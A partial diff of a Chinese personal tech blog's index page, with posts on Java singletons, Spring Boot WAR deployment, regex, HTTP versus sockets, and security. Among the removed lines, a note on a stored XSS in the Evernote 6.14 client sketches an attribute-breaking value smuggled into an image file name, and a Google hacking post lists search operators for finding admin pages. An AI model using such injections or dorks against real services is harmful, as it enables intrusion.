-        <p>1.印象笔记6.14客户端版本<br>存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。<br>src属性或者value属性?<br><img ..="" src="图片路径 + 图片名"><br><img ..="" src="图片路径 + " onclick="xss">.jpg “&gt;</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/06/security/xss/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/java单例" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/31/java/java单例/">单例模式</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/31/java/java单例/" class="archive-article-date">
-  	<time datetime="2018-10-31T08:43:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-用途"><a href="#1-用途" class="headerlink" title="1.用途"></a>1.用途</h4><p>用来维护一个全局的类，保存某些常用数据，减少资源消耗。</p>
-<h4 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h4><p>维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。</p>
-<h4 id="3-两种常用实现"><a href="#3-两种常用实现" class="headerlink" title="3.两种常用实现"></a>3.两种常用实现</h4><p>1.饿汉式<br>线程安全，非懒加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class Singleton &#123;</span><br><span class="line">    //这句饿汉式的关键，类加载时初始化</span><br><span class="line">    private static  final Singleton instance = new Singleton();</span><br><span class="line">    //维护的数据</span><br><span class="line">    private Map&lt;String,Map&gt; data;</span><br><span class="line">    //构造函数,初始化一次</span><br><span class="line">    private Singleton()&#123;</span><br><span class="line">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class="line">    &#125;;</span><br><span class="line">    //获取实例</span><br><span class="line">    public static final Singleton getInstance()&#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //全局获取维护的数据</span><br><span class="line">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class="line">        return this.data;</span><br><span class="line">    &#125;</span><br><span class="line">    //修改数据</span><br><span class="line">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class="line">        this.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>2.静态内部类<br>可用调用时再初始化加载(lazyLoad)。<br><br>线程安全，懒加载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Singleton &#123;</span><br><span class="line">    //静态内部类</span><br><span class="line">    private static class SingletonHolder&#123;</span><br><span class="line">        private static  final Singleton instance = new Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    //维护的数据</span><br><span class="line">    private Map&lt;String,Map&gt; data;</span><br><span class="line">    //构造函数,初始化一次</span><br><span class="line">    private Singleton()&#123;</span><br><span class="line">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class="line">    &#125;;</span><br><span class="line">    //获取实例</span><br><span class="line">    public static final Singleton getInstance()&#123;</span><br><span class="line">        return SingletonHolder.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //全局获取维护的数据</span><br><span class="line">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class="line">        return this.data;</span><br><span class="line">    &#125;</span><br><span class="line">    //修改数据</span><br><span class="line">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class="line">        this.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">package com.bonc.sms.controller;</span><br><span class="line"></span><br><span class="line">import com.bonc.sms.entity.PlatformChannelSpEntity;</span><br><span class="line">import com.bonc.sms.entity.PlatformEntity;</span><br><span class="line">import com.bonc.sms.service.PlatformService;</span><br><span class="line">import com.bonc.sms.util.Singleton;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.boot.CommandLineRunner;</span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">public class InitDid implements CommandLineRunner &#123;</span><br><span class="line">    private static final Logger logger = LoggerFactory.getLogger(InitDid.class);</span><br><span class="line">    @Autowired</span><br><span class="line">    PlatformService platformService;</span><br><span class="line">    @Override</span><br><span class="line">    public void run(String... strings) &#123;</span><br><span class="line">        Map data = new HashMap&lt;String,Map&gt;();</span><br><span class="line">        System.out.println(&quot;**************************platform*************initdid&quot;);</span><br><span class="line">        List&lt;PlatformEntity&gt; platform = platformService.getPlatformAll();</span><br><span class="line">        System.out.println(&quot;***:&quot;+ platform.size());</span><br><span class="line">        for(PlatformEntity platformEntity: platform)&#123;</span><br><span class="line">//            String url = platformService.getSpUrl(platformEntity.getSp_number()).getUrl();</span><br><span class="line">            Map value = new HashMap&lt;String, String&gt;();</span><br><span class="line">            value.put(&quot;platform_name&quot;, platformEntity.getPlatform_name());</span><br><span class="line">            value.put(&quot;platform_address&quot;, platformEntity.getPlatform_address());</span><br><span class="line">            value.put(&quot;platform_type&quot;, platformEntity.getPlatform_type());</span><br><span class="line">            value.put(&quot;platform_key&quot;,platformEntity.getPlatform_key());</span><br><span class="line">            List&lt;PlatformChannelSpEntity&gt; platformChannelSpEntities = platformService.getPlatformChannelSp(platformEntity.getPlatform_id());</span><br><span class="line">            List&lt;String&gt; channel = new ArrayList&lt;String&gt;();</span><br><span class="line">            Map&lt;String,String&gt; channel_sp = new HashMap&lt;String, String&gt;();</span><br><span class="line">            Map&lt;String,String&gt; channel_url = new HashMap&lt;String, String&gt;();</span><br><span class="line">            for(PlatformChannelSpEntity platformChannelSpEntity: platformChannelSpEntities)&#123;</span><br><span class="line">                channel.add(platformChannelSpEntity.getChannel_id());</span><br><span class="line">                channel_sp.put(platformChannelSpEntity.getChannel_id(),platformChannelSpEntity.getSp_number());</span><br><span class="line">                String url = platformService.getSpUrl(platformChannelSpEntity.getChannel_id());</span><br><span class="line">                channel_url.put(platformChannelSpEntity.getChannel_id(),url);</span><br><span class="line">            &#125;</span><br><span class="line">            value.put(&quot;channel&quot;,channel);</span><br><span class="line">            value.put(&quot;channel_sp&quot;,channel_sp);</span><br><span class="line">            value.put(&quot;channel_url&quot;, channel_url);</span><br><span class="line">            data.put(platformEntity.getPlatform_id(), value);</span><br><span class="line">        &#125;</span><br><span class="line">        Singleton.getInstance().setData(data);</span><br><span class="line">        logger.info(&quot;需要的平台缓存信息初始化完成&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/31/java/java单例/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/springboot打war包" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/17/java/springboot打war包/">springboot打war包</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/17/java/springboot打war包/" class="archive-article-date">
-  	<time datetime="2018-10-17T07:14:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="Springboot部署war包到服务器上"><a href="#Springboot部署war包到服务器上" class="headerlink" title="Springboot部署war包到服务器上"></a>Springboot部署war包到服务器上</h4><p>1.修改打包方式为war<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;com.xcloud&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;import-xcloud&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class="line">   &lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></table></figure></p>
-<p>2.移除内置tomcat，引入外部的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;!--使用外部tomcat时放开--&gt;</span><br><span class="line">            &lt;exclusions&gt;</span><br><span class="line">                &lt;exclusion&gt;</span><br><span class="line">                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                    &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class="line">                &lt;/exclusion&gt;</span><br><span class="line">            &lt;/exclusions&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.0-alpha-1&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
-<p>3.修改启动类，继承extends SpringBootServletInitializer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootApplication</span><br><span class="line">public class ImportXcloudApplication extends SpringBootServletInitializer &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(ImportXcloudApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //返回启动类builder</span><br><span class="line">    @Override</span><br><span class="line">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class="line">        return builder.sources(ImportXcloudApplication.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">springboot</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">tomcat</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/17/java/springboot打war包/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/正则" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/10/java/正则/">正则</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/10/java/正则/" class="archive-article-date">
-  	<time datetime="2018-10-10T03:28:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-正则表达式"><a href="#1-正则表达式" class="headerlink" title="1.正则表达式"></a>1.正则表达式</h4><p>正则表达式一般用来匹配字符串，进行相应处理。</p>
-<h4 id="2-常用符号"><a href="#2-常用符号" class="headerlink" title="2.常用符号"></a>2.常用符号</h4><ul>
-<li>(exp)  子串</li>
-<li>{n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。</li>
-<li>* + ? 限定次数。分别为:0或多次;1或多次;0或1次</li>
-<li>| 或 &nbsp;&nbsp;[a|b]匹配a或b</li>
-<li>^ java中为非，一般为匹配开始位置</li>
-<li>$ 匹配结尾位置</li>
-<li>\b 匹配边界，即字与空格间的位置</li>
-<li>数字 [0-9]或\d &nbsp;&nbsp;非数字 [^0-9]或\D</li>
-<li>字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]</li>
-<li>任何字符 [A-Za-z0-9]或\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\W</li>
+        <h4 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>
+<h4 id="2-OSI七层模型"><a href="#2-OSI七层模型" class="headerlink" title="2.OSI七层模型"></a>2.OSI七层模型</h4><p><img src="./osi_七层模型.jpg" alt="OSI"><br>图片来自:<a href="https://www.jianshu.com/p/a18a5ba78fad" target="_blank" rel="noopener">https://www.jianshu.com/p/a18a5ba78fad</a></p>
+<h4 id="3-Http与Socket所在层"><a href="#3-Http与Socket所在层" class="headerlink" title="3.Http与Socket所在层"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>
+<p>Tcp/Udp: 传输层。<br></p>
+<p>Ip: 网络层.<br></p>
+<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>
+<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>
+<h4 id="4-数据的处理流程"><a href="#4-数据的处理流程" class="headerlink" title="4.数据的处理流程"></a>4.数据的处理流程</h4><ul>
+<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>
+<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>
+<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>
+<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>
+<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>
 </ul>
-<h4 id="3-例子"><a href="#3-例子" class="headerlink" title="3.例子"></a>3.例子</h4><ol>
-<li><p>例一</p>
-<p> 匹配两个或三个十一位的电话号码，中间用逗号分割(java)</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String zz1 = &quot;(\\d&#123;11&#125;,)&#123;1,3&#125;\\d&#123;11&#125;&quot;;</span><br><span class="line">String str1 = &quot;17888824094,17888824094,17888824094&quot;;</span><br><span class="line">boolean isTrue1 = Pattern.matches(zz1, str1);</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
+<h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><ul>
+<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>
+<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>
+<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>
+<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>
+</ul>
 
       
 
@@ -669,7 +935,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">protocol</a>
         		</li>
       		
 		</ul>
@@ -679,297 +945,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/10/java/正则/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-security/googlehacking" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/10/security/googlehacking/">googlehacking</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/10/security/googlehacking/" class="archive-article-date">
-  	<time datetime="2018-10-09T21:24:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-GooleHacking"><a href="#1-GooleHacking" class="headerlink" title="1.GooleHacking"></a>1.GooleHacking</h4><p>利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br></p>
-<h4 id="2-关键字"><a href="#2-关键字" class="headerlink" title="2.关键字"></a>2.关键字</h4><ul>
-<li>intext/allintext: 在正文中搜索</li>
-<li>intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多</li>
-<li>cache: 缓存中？？</li>
-<li>filetype: 文件类型,   例:信息安全 filetype:doc</li>
-<li>info: 摘要信息</li>
-<li>inurl/allinurl: 在网址中</li>
-<li>site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com</li>
-<li>related: 搜索相关站点。  例:related:pku.edu.cn</li>
-<li>inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn</li>
-<li>author: 新闻组贴子的作者。例:在google scholar搜索作者. author:”John”</li>
-<li>datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968</li>
-<li>weather: 天气. 例: weather:beijing</li>
-<li>group:</li>
-<li>stocks: 股票信息。 例:stocks:alibaba</li>
-<li>define:显示某术语定义。例:define:网络安全</li>
-<li>phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话</li>
-<li>link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:<a href="http://www.vvv518.com" target="_blank" rel="noopener">www.vvv518.com</a></li>
-<li>msgid: 通过消息id搜索</li>
-</ul>
-<h4 id="3-语法"><a href="#3-语法" class="headerlink" title="3.语法"></a>3.语法</h4><ul>
-<li>“” 精确操作</li>
-<li>关键字之间不需要间隔，空格代表逻辑与操作</li>
-<li>- 忽略某个关键词. 例:a-b 搜索有a没b的网页</li>
-<li>～ 同义词</li>
-<li>+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。</li>
-<li>布尔and/or/not 例：aorb</li>
-<li>通配符，出现通配符的关键字需要用引号。*多个， ？和 . 单个</li>
-</ul>
-<h4 id="4-注意"><a href="#4-注意" class="headerlink" title="4.注意"></a>4.注意</h4><ol>
-<li>google只能32个单词查询。<br></li>
-<li>操作符、冒号、关键字之间是没有空格的。</li>
-<li>高级操作符能够和单独的查询混合使用</li>
-</ol>
-<h4 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h4>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/10/security/googlehacking/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-java/tomcat-session/tomcat-redis-session" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/28/java/tomcat-session/tomcat-redis-session/">tomcat利用redis保持session共享</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/28/java/tomcat-session/tomcat-redis-session/" class="archive-article-date">
-  	<time datetime="2018-09-28T07:47:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="1-需求"><a href="#1-需求" class="headerlink" title="1.需求"></a>1.需求</h4><p>不同Ip主机上的tomcat,保持session同步。<br></p>
-<h4 id="2-查资料"><a href="#2-查资料" class="headerlink" title="2.查资料"></a>2.查资料</h4><p>一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br><br>开源项目<a href="https://github.com/jcoleman/tomcat-redis-session-manager，" target="_blank" rel="noopener">https://github.com/jcoleman/tomcat-redis-session-manager，</a> 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br><br>解决方案参照：<a href="https://my.oschina.net/Listening/blog/674759" target="_blank" rel="noopener">https://my.oschina.net/Listening/blog/674759</a>, 直接用gradle生成jar包。</p>
-<h4 id="3-实现"><a href="#3-实现" class="headerlink" title="3.实现"></a>3.实现</h4><p>tomcat7.0.61/nginx1.10.3/ubuntu虚拟机</p>
-<h6 id="1-tomcat"><a href="#1-tomcat" class="headerlink" title="1.tomcat"></a>1.tomcat</h6><ul>
-<li>解压两个tomcat到两个虚拟机</li>
-<li>conf/server.xml更改端口，使之不重复</li>
-<li>添加index.jsp到 webapps/Root目录下</li>
-<li>分别启动tomcat,看看是否正常<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">String path = request.getContextPath();  